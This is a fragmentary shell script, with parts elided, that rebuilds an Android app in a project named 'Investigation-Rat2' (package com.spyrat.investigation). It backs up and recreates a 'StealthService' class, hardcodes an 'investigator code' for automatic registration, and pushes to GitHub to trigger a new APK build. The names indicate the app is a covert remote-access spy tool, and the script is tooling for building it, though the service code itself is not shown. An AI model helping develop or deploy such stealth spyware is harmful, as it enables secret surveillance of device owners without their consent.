...
echo "🔧 FIXING APK INVESTIGATOR CODE..."

cd ~/Investigation-Rat2

# Backup current files
cp app/src/main/java/com/spyrat/investigation/StealthService.java app/src/main/java/com/spyrat/investigation/StealthService.java.backup

# ==================== HARDCODE YOUR INVESTIGATOR CODE ====================
echo "🔑 HARDCODING INVESTIGATOR CODE: AxyI1nuw"

# Create StealthService with your hardcoded investigator code
...
echo "✅ APK FIXED WITH YOUR INVESTIGATOR CODE: AxyI1nuw"
...
# Commit the fix
git commit -m "Fix: hardcode investigator code AxyI1nuw for automatic registration"

# Push to GitHub
git push origin main

echo "🎉 NEW APK BUILD STARTED!"
echo "📱 Download the new APK when build completes"
echo "🔑 It will automatically use your code: AxyI1nuw"
